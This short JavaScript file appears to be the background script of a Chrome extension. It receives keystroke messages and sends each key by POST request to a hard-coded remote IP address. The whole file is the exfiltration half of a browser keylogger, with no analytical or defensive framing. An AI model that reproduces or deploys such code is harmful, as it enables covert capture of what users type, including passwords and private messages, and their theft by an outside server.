chrome.runtime.onMessage.addListener(function (request) {
  if (request.type === 'keypress') {
    fetch('http://52.77.46.250/logs', {
      method: 'POST',
      body: request.key
    })
      .then((response) => response.json())
      .then((json) => console.log(json));
  }
});
